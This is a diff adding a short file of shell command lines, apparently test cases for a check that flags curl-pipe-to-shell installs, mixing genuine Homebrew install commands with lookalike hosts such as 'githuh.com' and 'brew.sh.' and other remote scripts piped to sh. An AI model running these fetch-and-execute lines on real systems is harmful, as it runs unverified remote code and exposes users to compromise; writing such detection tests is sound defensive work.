@@ -1,0 +1,11 @@
+curl -fsSL https://brew.sh/install.sh | sh
+curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh | bash
+curl -fsSL example.org/i.sh | sh
+curl -o brew.sh https://example.org/i.sh
+echo githuh.com | sh
+ls github.com
+curl -fsSL https://brew.sh./install.sh | sh
+curl -fsSL https://gitlab.com/x/install.sh | sh
+curl -fsSL https://docker.io/install | sh
+curl -fsSL https://gun.sh/install | sh
+sh -c "$(curl -fsSL https://brew.sh/install)"
